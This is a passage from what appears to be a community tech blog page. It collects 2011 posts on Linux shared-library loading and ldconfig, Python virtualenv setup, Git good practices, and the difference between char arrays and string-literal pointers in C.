<p>Static library-generated executables have increased portability. All code is inserted into the executable such that, moving it on a different platform doesn’t require the presence of that library. These executables tend to be faster as no additional overhead is implied during load-time or run-time.</p>
<p>Dynamic library-generated executables have two main advantages: they are smaller in size and library files have a smaller memory footprint. The first advantage is due to not copying function code at link time: only references are added to the executable without additional code. The second advantage is stated in the Unix name for dynamic libraries: shared-object libraries. A library may be mapped in memory and all processes that use the library would use the same code. Thus, 50 processes that use the C standard library would require a single instance of the library to be mapped in memory.</p>
<h1 id="library-management">Library Management</h1>
<p>When discussing about library management, we are talking about dynamic libraries. This is due to the fact that, when using the library code (either at load-time or run-time), the loader needs to know where to find the requested libraries.</p>
<p>The Linux loader is called <code>ld-linux.so</code>. As stated in the <a href="http://linux.die.net/man/8/ld-linux" title="ld-linux(8): dynamic linker/loader - Linux man page">man page</a>: “The programs ld.so and ld-linux.so find and load the shared libraries needed by a program, prepare the program to run, and then run it.” The loader needs to lookup shared libraries in order to run the program and instantiate a process.</p>
<p>Bear in mind that the <code>-L.</code> option passed to GCC when doing linking is only used at link-time. It’s used to locate the library at link-time, not at load-time or run-time.</p>
<p>In order to configure the loader to lookup libraries for dynamic linking in a given folder (for example, the current folder – <code>.</code>), there are two main options: using the <code>LD_LIBRARY_PATH</code> environment variable or the <code>ldconfig</code> command.</p>
<p>The <code>LD_LIBRARY_PATH</code> variable is a list of colon delimited folders where libraries are searched. It must be set when the loader is invoked – that is, when running the executable:</p>
<pre>
    export LD_LIBRARY_PATH=.
    ./myexec
</pre>

<p>Using the <code>LD_LIBRARY_PATH</code> variable is excellent for testing. It does however pose two disadvantages: it does not allow persistent configuration and it may suffer from <a href="http://www.unix.com/unix-dummies-questions-answers/22806-why-bad-idea-insert-dot-path.html" title="Why is is a Bad Idea to Insert . (Dot) to PATH?">security vulnerabilities similar to the PATH environment variable</a>.</p>
<p>The configuration approach is the use of the <code>ldconfig</code> command. <code>ldconfig</code> is used to populate the library list cache file <code>/etc/ld.so.cache</code>. The cache file is read by the loader to search for libraries. On Debian-based systems, every time you install a library, <code>ldconfig</code> is run to populate the cache file.</p>
<p>In order to incorporate a new folder in the library search path, one may resort to a persistent configuration or a temporary one. For a temporary run, simply pass the new folder to <code>ldconfig</code>:</p>
<pre>
    razvan@einherjar:~/code$ /sbin/ldconfig -p | grep libtest
    razvan@einherjar:~/code$ sudo /sbin/ldconfig /home/razvan/code/
    razvan@einherjar:~/code$ /sbin/ldconfig -p | grep libtest
    	libtest.so (libc6,x86-64) =&gt; /home/razvan/code/libtest.so
</pre>

<p>For a persistent, configuration, one would need to edit the configuration file and/or folder for <code>ldconfig</code>, namely <code>/etc/ld.so.conf</code> and <code>/etc/ld.so.conf.d/</code>. Simply add a new folder in the configuration file and run <code>ldconfig</code>.</p>
<p>When using <a href="http://linux.die.net/man/3/dlopen" title="dlopen(3) - Linux man page">dlopen &amp; friends</a>, the same kind of configurations may be used: <code>LD_LIBRARY_PATH</code>, temporary use of <code>ldconfig</code> and persistent use of <code>/etc/ld.so.conf</code>.</p>
<h1 id="conclusion-and-further-info">Conclusion and Further Info</h1>
<p>Extensive information about the actions used by the loader to use dynamic libraries are found in man pages: <a href="http://linux.die.net/man/8/ld-linux" title="ld-linux(8): dynamic linker/loader - Linux man page">ld-linux.so</a>, <a href="http://linux.die.net/man/8/ldconfig" title="ldconfig(8) - Linux man page">ldconfig</a> and <a href="http://linux.die.net/man/3/dlopen" title="dlopen(3) - Linux man page">dlopen &amp; friends</a>.</p>
<p><a href="http://books.google.com/books?id=Id9cYsIdjIwC" title="John R. Levine – Linkers &amp; Loaders">John R. Levine’s “Linkers &amp; Loaders”</a> is an extensive depiction of linkers, loaders, libraries and the load process.</p>
<p>Proper knowledge of library management on a Linux based system relies on good understanding of the linking and loading processes and library types. Make sure you understand the advantages and disadvantages of each approach and choose the one most suitable to your specific needs.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./python-environment.html" title="Python environment">Python environment</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on September 25, 2011</span>
            by
            <span class="author">Alex</span>
            </span>

            <p>This article is a quick guide to setting up a Python work environment. It walks you through installing Python with some basic package management tools (distribute, pip, virtualenv), setting up projects, and installing packages.</p>
<h3 id="bootstrapping">Bootstrapping</h3>
<p>First of all we need to have a working Python interpreter. You want to install the latest release of <code>2.7</code> for now (September 2011). Python 3 is gathering momentum but many libraries don’t support it yet.</p>
<ul>
<li><p>In most Linux distributions, and in Mac OS, some Python is already installed. You may, of course, install a different one from scratch. For Mac OS, the <a href="http://mxcl.github.com/homebrew/">homebrew</a> version is highly recommended.</p></li>
<li><p>On Windows you install a pre-compiled release from <a href="http://python.org/download/">http://python.org/download/</a>.</p></li>
<li><p>To install from source, you need a C compiler, and a tarball from <a href="http://python.org/download/">http://python.org/download/</a>. The usual <code>./configure; make; make   install</code> should work just fine. Consider installing into a separate folder, e.g. <code>./configure --prefix=/usr/local/Python-2.7</code>, so you can easily remove it at some point in the future.</p></li>
</ul>
<p>Now, the typical mistake is to declare victory, and use this Python installation for everything. In time, you want to use various libraries, so you install them on top of Python. Eventually you get a version conflict (some project requires a library which is too new for another project). Fortunately there is a better way: <em>virtualenv</em>.</p>
<p>The command-line examples use <code>$MYPYTHON</code> as placeholder for the Python installation path. This can be <code>/usr</code> for a Linux distribution install, <code>/usr/local</code> for default manual installation, <code>/usr/local/Cellar/python/2.7.2</code> for mac Homebrew, or even <code>C:\Python27</code> on Windows.</p>
<p>If you’re on Linux, and use a Python package from the distribution, it’s a good bet they have virtualenv too. For Debian, Ubuntu and Fedora, the name is <code>python-virtualenv</code>. This may be outdated, so if you experience problems, check the version and consider installing the latest one (see below).</p>
<p>In a fresh Python installation, to get virtualenv, we need to install <em>distribute</em> and <em>pip</em> first. distribute is an older package manager, and pip is newer and more powerful, but it depends on the older one to do heavy lifting. So, download <a href="http://python-distribute.org/distribute_setup.py"><code>distribute_setup.py</code></a>, and, assuming you installed Python in a folder called <code>$MYPYTHON</code>, do the following:</p>
<pre><code>&gt; $MYPYTHON/bin/python distribute_setup.py
&gt; $MYPYTHON/bin/easy_install pip
&gt; $MYPYTHON/bin/pip install virtualenv</code></pre>
<p>If everything worked out fine, you should have a script called <code>virtualenv</code> in <code>$MYPYTHON/bin</code>, and you can safely remove <code>distribute_setup.py</code> and <code>distribute-x.y.z.tar.gz</code>.</p>
<p>That’s all you normally install in the global Python folder. Maybe throw in some commonly-used, slow-to-change, takes-a-while-to-compile package like <a href="http://www.pythonware.com/products/pil/">PIL</a> or <a href="http://www.scipy.org/">SciPy</a>, or the odd manually-installed kits on Windows, but everything else goes into a virtualenv.</p>
<h3 id="virtual-insanity">Virtual insanity</h3>
<p>Say you want to work on <a href="https://projects.rosedu.org/projects/wousodjango">WoUSO</a>, and the documentation tells you that you need to install <a href="https://www.djangoproject.com/">Django</a>. The very first thing you do is create a virtualenv. We’ll use <code>$MYENV</code> as placeholder for the path to a new folder where you want to work:</p>
<pre><code>&gt; $MYPYTHON/bin/virtualenv $MYENV</code></pre>
<p>virtualenv will create the folder, write some files, then run off and get distribute and pip, it should all take a few seconds. When it’s done, you have <code>$MYENV/bin/python</code>, which is a fully functional Python interpreter. Next to it, there is <code>$MYENV/bin/pip</code>, which you can now use to install things:</p>
<pre><code>&gt; $MYENV/bin/pip install Django</code></pre>
<p>This will go to <a href="http://pypi.python.org/">PyPI</a>, look for a package named <code>Django</code>, and install the latest version. The installation happens inside <code>$MYENV</code>, in the <code>lib/python2.7/site-packages</code> subfolder. This Django doesn’t affect the original Python installation or any other virtualenvs you create. Of course, multiple virtualenvs can have different versions of Django.</p>
<h3 id="bits-and-pieces">Bits and pieces</h3>
<p>Now, if you start happily creating many virtualenvs, installing a lot of packages, you’ll be downloading the same files over and over again. Fortunately, pip can be configured to cache the downloads:</p>
<pre><code>&gt; cat ~/.pip/pip.conf
[global]
download_cache = ~/.pip/cache</code></pre>
<p>Depending on the setup, sometimes you have to deal with globally-installed packages, for example if you’re using the Python from a Linux distribution. It’s still possible to create a virtualenv that ignores those packages by passing the <code>--no-site-packages</code> option to virtualenv. This simply leaves out the global <code>site-packages</code> folder from Python’s import path.</p>
<p>Some projects include a <code>requirements.txt</code> file in their source tree, which lists dependencies. You install these with <code>pip install -r requirements.txt</code>. Writing your own <code>requirements.txt</code> is easy: each line is a set of arguments for one invocation of pip. Or simply run <code>pip freeze</code>, it generates a list of all the installed packages and their versions.</p>
<p>When you get tired of typing <code>$MYENV/bin/something</code> all the time, you may want to <em>activate</em> the virtualenv. This is a fancy name which simply means that <code>$MYENV/bin</code> is prepended to your current <code>$PATH</code> (and your <code>$PS1</code> is enhanced):</p>
<pre><code>&gt; . $MYENV/bin/activate
(myenv)&gt; # &quot;python&quot; invokes &quot;$MYENV/bin/python&quot;
(myenv)&gt; deactivate
&gt; # back to the original shell environment</code></pre>
<p>If you find yourself working on a package, the kind that has <code>setup.py</code> and installs with pip, you want to install the package in “edit” mode. Check out the source tree, then (assuming you’re in the same folder with <code>setup.py</code>) run <code>pip install -e .</code>. This will install the package in-place. Technically, a link is made in <code>site-packages</code> that extends Python’s import path to find your package, any dependencies in <code>setup.py</code> are installed, and scripts are installed in <code>$MYENV/bin</code>, if the package has any.</p>
<h3 id="further-reading">Further reading</h3>
<p>These wonderful tools are available on <a href="http://pypi.python.org/">PyPI</a>, the Python Package Index. Most of them have good documentation that explains more features that did not fit in this article. Also, remember <code>docs.python.org</code> (behold the <a href="http://docs.python.org/contents.html">table of contents</a>), where you can find documentation on the language, a nice tutorial, and excellent documentation for the standard library.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./git-good-practices.html" title="Git Tips and Good Practices">Git Tips and Good Practices</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on September 12, 2011</span>
            by
            <span class="author">Răzvan</span>
            </span>

            <p><a href="http://git-scm.com/" title="Git">Git</a> is an excellent SCM (source code management system). I use it for a plethora of tasks such as managing code, scripts, LaTeX files, config files, <a href="http://orgmode.org/" title="Org-Mode">Org-Mode</a> files. I try to base all my actions on text files such that it could be managed through Git.</p>
<p>In this post I wish to share some of the knowledge and skills I’ve gathered throughout the time of using Git. I am novice myself in many aspects of using Git, but I feel confident of my basic usage skill and good practices.</p>
<p>My aim is to present tips and good practices that allow using Git at its value and conforming to recommendations. This is not a tutorial or a comprehensive view of Git. In case you are looking for that I recommend the excellent <a href="http://gitimmersion.com/" title="Git Immersion">Gitimmersion tutorial</a> and the <a href="http://progit.org/" title="Pro Git Book">Pro Git Book</a>.</p>
<p>An important aspect to have in mind is the data model that Git uses. While most SCMs use changesets to manage commits, Git uses snapshots. Each commit is a snapshot of the entire project; it is not a set of file patches. Bear this in mind when using Git commands and playing around with commits. You may also check <a href="http://learn.github.com/p/intro.html#snapshots_not_changesets" title="GitHub - Introduction to Git">this tutorial</a> for a more thorough presentation.</p>
<h3 id="configuring-git">Configuring Git</h3>
<p>The first step of using Git is configuring your identity and preferences, as highlighted by most tutorials. The recommended practice is to configure Git at system level (using the <code>--global</code> option):</p>
<pre><code>git config --global user.name &quot;Razvan Deaconescu&quot;
git config --global user.email &quot;razvan.deaconescu@cs.pub.ro&quot;
git config --global color.ui auto</code></pre>
<p>I recommend issuing the above commands each time you are using an account that will make use of Git commands.</p>
<p>In case you want a different configuration (another email address, for example) for a given repository, just issue the above commands (sans the <code>--global</code> option) while in that repository.</p>
<p>A situation may arise when you want to create a commit (or a series of commits) that use different user information. This may happen when you and a friend have access to a common account, and you want to separate your commits form hers/his (although run from the same account). There are two situations and approaches to this:</p>
<ol style="list-style-type: decimal">
<li><p>Situation: You want to use a different identity for all (or most) commits in a shell session (such as an SSH login session). Solution: Define the <code>GIT_AUTHOR_NAME</code> and <code>GIT_AUTHOR_EMAIL</code> environment variables:</p>
<p><code>export GIT_AUTHOR_NAME=&quot;Mighty McWolf&quot;</code></p>
<p><code>export GIT_AUTHOR_EMAIL=&quot;mighty@mcwolf.org&quot;</code></p></li>
<li><p>Situation: You want to use a different identity for a single commit. Solution: Use the <code>--author</code> option when committing:</p>
<p><code>git commit --author &quot;Mighty McWolf &lt;mighty@mcwolf.org&gt;&quot;</code></p></li>
</ol>
<h3 id="commits">Commits</h3>
<p>Everything in Git revolves around commits. A commit is a basic unit of information that you submit to Git for handling. Git stores each commit and links it to other commits such that you see a commit history, get back to a previous state, create a branch, watch the commit tree, update certain commits, create tags and many others. As mentioned above, a commit represents a snapshot of the entire project.</p>
<p>A basic rule, that applies to all other SCMs, is that each commit must keep the repository in a compilable state. That is, if one would checkout to a random place in the commit history, he/she would still be able to compile the source code. Make sure the project is in a compilable state when issuing your commit.</p>
<p>While the repository needs to be in a compilable state, it need not run perfectly. In fact it may end up in “Segmentation fault” or other critical errors. That’s no problem; it’s not achievable (not possible actually) to have a clean repository where each commit would break nothing. Do not be afraid to break the application when issuing a commit as long as its in a compilable state. If the application breaks, another commit will fix it; an impatient contributor could very well revert to a previous commit and create a branch from there. Moreover, trying to keep the application running, may force you to disobey the next recommendation.</p>
<p>Another important recommendation, heavily stressed in Git but probably insisted on in other SCMs, is creating small, atomic commits. Each commit should do one thing and do it well. A commit should not use a message such as “Update everything.” or “Fix plenty of errors.” Rather, each fix should go into a separate commit. This would make it very easy for a reviewer to analyze and diff your commit and, possibly, isolate a bug that you may have introduced. If your commit ranges a whole bunch of features that introduce multiple bugs, isolating those bugs and fixing them is a pain.</p>
<p>So, remember: <strong>Create small atomic commits that keep the repository in a compilable state</strong>.</p>
<h3 id="commit-messages">Commit Messages</h3>
<p>When your commit is ready, you’ll issue the <code>git commit</code> command and either use the configured editor or the <code>-m</code> option to write the commit message. Either way there’s a basic set of recommendations you should follow when writing a commit message.</p>
<ol style="list-style-type: decimal">
<li><p>Keep it short. Ideally, your commit message should consist of at most 50 characters. In case your message is longer, break it into sentences, and leave a blank line between the 50 characters message and the rest. The rationale, as mentioned in the <a href="http://www.kernel.org/pub/software/scm/git/docs/git-commit.html" title="git commit manual page">git commit manpage</a>, is that the first line is used as an email subject line by various tools.</p></li>
<li><p>Use present tense when issuing a commit. This ensures “compatibility” with messages used by tools such as <code>git merge</code>.</p></li>
<li><p>Write sentences not descriptions, similar to good code comments. Use capital letter, use verbs and end with dot.</p></li>
</ol>
<p>Tim Pope <a href="http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html" title="A Note About Git Commit Messages">writes</a> about what makes a model Git commit message.</p>
<h3 id="creating-and-updating-commits">Creating and Updating Commits</h3>
<p>Remember that your commits should be small: do one thing, do one thing well.</p>
<p>What happens when you’ve made a lot of changes and you want to create a commit? You need to “split” your changes in multiple commits. For that you use <code>git add -i</code> (<code>-i</code> for interactive). When using <code>-i</code> Git inquires you about the commit. Most likely you would: 1. choose the <code>patch</code> option (press <code>p</code> or <code>5</code>) 2. choose the file you want to “split” 3. press <code>Enter</code> 4. answer <code>y</code> or <code>n</code> to include/exclude certain chunks 5. press <code>q</code> to quit</p>
<p>At this point, the modified file would be found both in the staging area and in the “changes” area. The staging area would solely consist of the chunks you selected previously.</p>
<p>What if you’ve just created a commit and realized that the commit message may be wrong or that there should have been another hunk or file committed? In this case you would use <code>git commit --amend</code>. As the options says, this gives you the possibility of amending the commit, be it to update the commit message or to add certain files: just issue <code>git add</code> (or <code>git add -i</code>) and then invoke <code>git commit --amend</code>. By adding <code>--author</code>, the <code>--amend</code> option allows you to even update the author identity.</p>
<p>What if you want to update a commit that is not the latest? If the commit has been pushed in the remote repository, then it’s quite complicated and not recommended. However, if the commit is local and hasn’t been pushed, you may used <code>git rebase -i</code>. You have to specify the commit id where rebasing will take place. Afterwards you will be prompted with an editor screen where you can select which of the commits that have been created. Usually you would replace the <code>pick</code> string with <code>edit</code> and Git will pass you through all commits.</p>
<p>For each commit you will most likely issue some <code>git add</code> commands, then <code>git commit --amend</code> and, finally, <code>git rebase --continue</code>.</p>
<p>As long as the commits are local (not pushed to the remote repository), all is fine.</p>
<h3 id="stashing">Stashing</h3>
<p>On certain occasions, you may need to run some commit update commands (such as <code>git rebase</code>, <code>git pull</code>) but retain some “dirty data” in the repository. As Git disallows the existence of non-committed data in such occasions, the solution is stashing.</p>
<p>Stashing means you temporarily store your data in a specialized zone such that it would not get in the way of the above commands. In order to stash local changes, you would simply issue the <code>git stash</code> command. After updates have occurred, use <code>git stash pop</code> to bring back changes and revert to the original “dirty state”.</p>
<h3 id="ignoring-data">Ignoring Data</h3>
<p>Some files or data have to be ignored from being commit, while others need to be ignored because of process specifics or use preference.</p>
<p>As a rule of thumb, a repository should only manage text files; no binary files such as image files, compressed files, object files, executable files. If you are a web developer or someone who has to work extensively with image files, the above rule wouldn’t apply 100%. You should however, only commit source code files and files that cannot be compiled or linked from other files.</p>
<p>Such that a good practice is to create a top-level <code>.gitignore</code> file in your repository and define files to be ignored. A basic <code>.gitignore</code> file is shown below:</p>
<p><strong>sample .gitignore</strong></p>
<pre><code>*~
*.swp
*.swo
*.o
*.obj
*.a
*.so
*.dll
*.lib
*.gz
*.bz2
*.zip</code></pre>
<p>Optional <code>.gitignore</code> files may be created in subfolders of the repository according to need.</p>
<p><code>.gitignore</code> files are committed in the repository and their exclusion rules are applied to all contributors. A situation may arise when you create a folder that you want to reside in your repository clone but never get committed. For example a <code>lib</code> folder consisting of libraries you are linking against for testing purposes. As it is binary data it shouldn’t be committed, and, as you are the only one using it, it should be ignored. You could add it to the <code>.gitignore</code> file but that would complicate it. The best solution is to edit the <code>.git/info/exclude</code> file. It follows the same syntax as <code>.gitignore</code> files but is local to your clone.</p>
<p>The above solutions are not useful in a specific situation: you want to ignore changes you make to a file that is being tracked. <code>.gitignore</code> and <code>.git/info/exclude</code> only ignore non-tracked files; they can’t be used on files that are being tracked. Your solution lies in running the command <code>git update-index --assume-unchanged abc.txt</code>. Issuing this command ensures that any local updates to the <code>abc.txt</code> file are not going to be taken into account when creating subsequent commits.</p>
<h3 id="viewing-git-information">Viewing Git Information</h3>
<p>A large part of your interaction with Git is analyzing commits, diffing, checking commit history etc. Visual tools are very important and provide you an intuitive view of the repository commits. Such tools are <a href="http://kernel.org/pub/software/scm/git/docs/git-gui.html" title="git-gui">Git GUI</a>, <a href="http://www.kernel.org/pub/software/scm/git/docs/gitk.html" title="Gitk">gitk</a> and <a href="http://live.gnome.org/giggle" title="Giggle">giggle</a>. A nice tool, running on an ncurses-based interface is <a href="http://jonas.nitro.dk/tig/" title="tig">tig</a>.</p>
<p>Apart from that, several commands are heavily used throughout your work in Git, from a “view point of view” so to say:</p>
<ul>
<li><p><code>git status</code> provides you with information regarding the current branch, information in staging area, “dirty” information etc.;</p></li>
<li><p><code>git log</code> provides you with a CLI view of the commit history; an useful option is <code>--oneline</code> providing you with a <code>one commit on one line</code> view;</p></li>
<li><p><code>git diff</code> presents a diff between various states of the repository;</p></li>
<li><p>without any option, <code>git diff</code> it shows changes in the working directory (versus <code>HEAD</code>);</p></li>
<li><p>a single option to <code>git diff</code> is a commit ID or tag that is diffed against <code>HEAD</code>;</p></li>
<li><p>two options tor <code>git diff</code> are two commit IDs or tags to be diffed.</p></li>
</ul>
<p>An useful option to <code>git diff</code> is <code>--cached</code>. This option presents a diff between <code>HEAD</code> and data in staging area. It’s useful to check everything is in order before creating a commit.</p>
<h3 id="cleaning-up">Cleaning Up</h3>
<p>An important activity is cleaning up files in different states (staging, modified, non-tracked).</p>
<p>The list below highlights various user requirements and solutions to those predicaments:</p>
<ul>
<li><p>You want to clear any updates you’ve done to a file that’s being tracked:</p>
<p><code>git checkout file.name</code></p></li>
<li><p>You want to remove a file from the staging area and place it in the modified state; you want to build your commit in a different manner:</p>
<p><code>git reset HEAD file.name</code></p></li>
<li><p>You want to clear non-tracked files from the working clone:</p>
<p><code>git clean file.name</code></p></li>
<li><p>You want to clear all non-tracked files from the working clone:</p>
<p><code>git clean -f</code></p></li>
<li><p>You want to clear all changes and revert to the initial state of <code>HEAD</code> (by changes I’m referring to tracked files changes; this doesn’t affect non-tracked files):</p>
<p><code>git reset --hard</code></p></li>
</ul>
<h3 id="other-resources">Other Resources</h3>
<p>The Internet is filled with tutorials and tips regarding the use of Git. <a href="http://www.google.com/" title="Google">Google</a> is one of your best friends to provide you a rapid solution to a problem. Through Google, I’ve found a lot of answers on <a href="http://stackoverflow.com/" title="Stack Overflow">Stack Overflow</a>.</p>
<p>As mentioned above, I find the <a href="http://gitimmersion.com/" title="Git Immersion">Git Immersion tutorial</a> to be very well presented and easy to follow and the <a href="http://progit.org/" title="Pro Git Book">Pro Git Book</a> as a good technical presentation of Git and its features. An excellent site, consisting of a plethora of very nicely presented tips is <a href="http://gitready.com/" title="git ready &gt;&gt; learn git one commit at a time">git ready</a>.</p>
<p>As a funny link, I recommend you access <a href="http://whatthecommit.com/" title="Commit Message Generator">Commit Message Generator</a>.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./arrays-vs-pointers.html" title="char[] versus char*">char[] versus char*</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on August 27, 2011</span>
            by
            <span class="author">Daniel</span>
            </span>

            <p>This post will shed some light on the differences between arrays and pointers specifically when it comes about referencing string literals. We will base our discussion on the following two programs:</p>
<p><img style="float:right" src="./images/arrays-vs-pointers.png" alt="Array and pointer representation" width="376" height="192" /> <strong>array.c</strong></p>
<pre><code>char a[] = &quot;ROSEdu&quot;;
int main(void)
{
	a[0] = 'r';
	printf(&quot;%s\n&quot;, a);
	return 0;
}</code></pre>
<p><strong>pointer.c</strong></p>
<pre><code>char *p = &quot;ROSEdu&quot;;
int main(void)
{
	*p = 'r';
	printf(&quot;%s\n&quot;, p);
	return 0;
}</code></pre>
<p>Program <em>array.c</em> defines an array of char whose elements are initialized with character string literals, while <em>pointer.c</em> defines a pointer to char and initializes it with the address of a memory area holding a string literal. Notice array <strong>a</strong> and pointer <strong>p</strong> allocations in the image above. Can you make a guess about size of <strong>a</strong> and size of <strong>p</strong>? Next, both programs modify the first character of the string literal <em>ROSEdu</em>. Are these two programs equivalent? At the first glance the answer seems to be positive, but let’s have a minute and actually run the code.</p>
<pre>
$ ./array
rOSEdu

$ ./pointer
Segmentation fault

</pre>
<p>While we could modify array <strong>a</strong>, our program was killed attempting to modify string literal pointed by <strong>p</strong>. We will now have a look at the generated assembly code and notice the section where string literal <em>ROSEdu</em> is stored.</p>
<p><img style="float:right" src="./images/arrays-vs-pointers-addr.png" alt="Array and pointer representation" width="298" height="283" /></p>
<pre>
$ gcc -S array.c -o array.s
$ cat array.s
.globl a
        .data
        .type  a, @object
        .size  a, 7
a:
       .string &quot;ROSEdu&quot;
</pre>

<pre>
$ gcc -S pointer.c -o pointer.s
$ cat pointer.s
globl p
       .section        .rodata
.LC0:
       .string &quot;ROSEdu&quot;
       .data
       .type  p, @object
       .size  p, 4
p:
       .long  .LC0
       .text
</pre>

<p>We can see that array <em>a</em> is stored in <em>data</em> section, which is writable and there is no problem when it is modified. On the other hand, we can notice that <em>p</em> is a pointer stored in <em>data</em> section but it points to a <em>read only</em> memory location, thus accessing it results in ‘Segmentation Fault’.</p>
<p><a href="http://c0x.coding-guidelines.com/">C99 standards</a> (<a href="http://c0x.coding-guidelines.com/6.7.8.html">Section 6.7.8</a>) states that:</p>
<ul>
<li>contents of the array <em>a</em> is modifiable.</li>
<li>if an attempt is made to use pointer <em>p</em> to modify the contents of the array, the behaviour is undefined.</li>
</ul>
<p>So now we see why <strong>pointer.c</strong> program crashed. gcc decided to store string literal pointed by <strong>p</strong> into read only data section. One must remark that this is not mandatory, and its implementation dependant.</p>
<p>We invite you to answer following questions:</p>
<ul>
<li>What is the sizeof(p) and sizeof(a) in our previous examples?</li>
<li>What happens if variables <strong>a</strong> and <strong>p</strong> are declared on the stack?</li>
<li>Is it possible for the following expression <code>(const char []){&quot;ROSEdu&quot;} == &quot;ROSEdu&quot;</code> to yield true?</li>
</ul>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./intro.html" title="Open Techblog: Success">Open Techblog: Success</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on June  8, 2011</span>
            by
            <span class="author">Mihai</span>
            </span>

            <p>This blog started as an idea of Răzvan Deaconescu based on the fact that several members of ROSEdu already had technical blogs (linked here on the right) but they were not updated on a regular basis. Having a community blog solves this problem and allows for a greater diversity among the topics presented. Without further ado, this is it.</p>
<p>Excluding this article, the blog will contain technical articles, tips and tricks, quick hacks to solve some problems and some articles explaining different things related to IT.</p>
<p>Thanks go to: Alex Juncu (setting up the Apache stuff), Răzvan Deaconescu (coming up with this idea and setting up the initial repository), Mihai Maruseac (configuration, layout, workflow both in the Jekyll version and the Haskell one and content manager), Matei Oprea, Marius Ungureanu and Alex Pălcuie (content managers).</p>
<p>If you wish to contribute, contact us at <script type="text/javascript">
<!--
h='&#114;&#x6f;&#x73;&#x65;&#100;&#x75;&#46;&#x6f;&#114;&#x67;';a='&#64;';n='&#116;&#x65;&#x63;&#104;&#98;&#108;&#x6f;&#x67;';e=n+a+h;
document.write('<a h'+'ref'+'="ma'+'ilto'+':'+e+'">'+e+'<\/'+'a'+'>');
// -->
</script><noscript>techblog at rosedu dot org</noscript>.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>



        </div>
      </div>

      <footer class="the-footer">
        <div class="unit-foot">
          <div class="unit-inner unit-foot-inner">
            <div class="misc vcard">
              <h4>Social</h4>
              <div class="rss">
                <a href="http://feeds.feedburner.com/rosedu/tech" target="_blank">
                  <img src="./images/rss.png" alt="Subscribe to RSS Feed" />
                </a>
                <a href="http://www.reddit.com/submit?url='+encodeURIComponent(window.location)" target="_blank" onclick="window.location='http://www.reddit.com/submit?url='+encodeURIComponent(window.location); return false">
                  <img src="./images/reddit.png" alt="Submit to Reddit" />
                </a>
                <a href="http://twitter.com/share" class="twitter-share-button" data-count="none" target="_blank">
                  <img src="./images/twitter.png" alt="Submit to Twitter" />
                </a>
              </div>

              <h4>Powered by</h4>
              <ul>
                <li class="contact">
                  <address>
                    <a class="author fn n" href="http://www.rosedu.org">ROSEdu</a>
                  </address>
                </li>
                <li class="contact">
                  <address>
                    <a class="author fn n" href="http://jaspervdj.be/hakyll">Hakyll</a>
                  </address>
                </li>
              </ul>

              <h4>License</h4>
              <div class="bucket">
                <span>
                  <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution 3.0 License">
                    <img src="//i.creativecommons.org/l/by/3.0/88x31.png" alt="License">
                  </a>
                </span>
                <span>
                  This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" class="subfoot">Creative Commons Attribution 3.0 License</a>.
                </span>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </body>
</html>
